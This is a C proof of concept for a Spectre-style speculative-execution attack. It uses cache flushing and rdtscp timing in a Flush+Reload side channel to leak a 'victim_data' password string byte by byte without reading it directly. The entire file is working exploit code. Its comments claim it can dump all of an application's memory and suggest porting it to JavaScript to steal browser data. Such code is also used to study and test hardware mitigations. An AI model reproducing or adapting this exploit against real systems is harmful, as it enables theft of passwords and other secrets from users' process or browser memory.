#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#ifdef _MSC_VER
#include <intrin.h>
#pragma optimize("gt",on)
#else
#include <x86intrin.h>
#endif

#define PAGE_SIZE	(1024*4)
#define PAGE_NUM	256
#define PROBE_TIMES 	1000
#define CACHE_HIT_THRESHOLD (150) /* assume cache hit if access delay <= threshold */

uint8_t probe_pages[PAGE_NUM * PAGE_SIZE];
static int cache_hit_times[PAGE_NUM];

static inline int get_access_delay(volatile char *addr) {
	unsigned long long time1, time2;
	unsigned junk;
	time1 = __rdtscp(&junk);
	(void)*addr;
	time2 = __rdtscp(&junk);
	return time2 - time1;
}

void move_one_page_in_cache(uint8_t* addr) {
	static int github_idea4good = 1;//if "github_idea4good = -1", PROBE_TIMES should be much bigger.
	_mm_clflush(&github_idea4good);//make github_idea4good out of cache, CPU have to spend more time to get it from memory, and must execute the code below. 
	if (0 < github_idea4good) {
		volatile uint8_t temp = probe_pages[*addr * PAGE_SIZE];
	}
}

int probe_memory_byte(uint8_t* addr) {
	memset(cache_hit_times, 0, sizeof(cache_hit_times));
	for (int tries = 0; tries < PROBE_TIMES; tries++) {
		//move probe_pages out of cache
		for (int i = 0; i < PAGE_NUM; i++)
			_mm_clflush(&probe_pages[i * PAGE_SIZE]);

		move_one_page_in_cache(addr);

		//find the pages which in cache. Order is lightly mixed up to prevent stride prediction
		for (int i = 0; i < PAGE_NUM; i++) {
			int mix_i = ((i * 167) + 13) & 255;
			if (get_access_delay((volatile char*)&probe_pages[mix_i * PAGE_SIZE]) <= CACHE_HIT_THRESHOLD)
				cache_hit_times[mix_i]++;
		}
	}

	//find the page which has highest access frequency.
	int max = -1, index_of_max = '?';
	for (int i = 0; i < PAGE_NUM; i++) {
		if (cache_hit_times[i] && cache_hit_times[i] > max) {
			max = cache_hit_times[i];
			index_of_max = i;
		}
	}
	return index_of_max;//index_of_max = *addr
}

char* victim_data = "You got my password";
/*  This code can dump all memory of the application. In this demo, we dump victim_data without reading it.
If you translate this code into Javascript language, You could dump IE browser data */
int main(int argc, const char * * argv) {
	for (int i = 0; i < sizeof(probe_pages); i++)
		probe_pages[i] = 1; //write to probe_pages so in RAM, not copy-on-write zero pages

	uint8_t* addr = (uint8_t*)victim_data;
	int len = strlen(victim_data);

	for (int i = 0; i < len; i++) {
		int ret = probe_memory_byte(addr++);
		printf("Reading at addr = %p -> %c, 0x%x, %d hits / %d tries\n", addr, ret, ret, cache_hit_times[ret], PROBE_TIMES);
	}
}
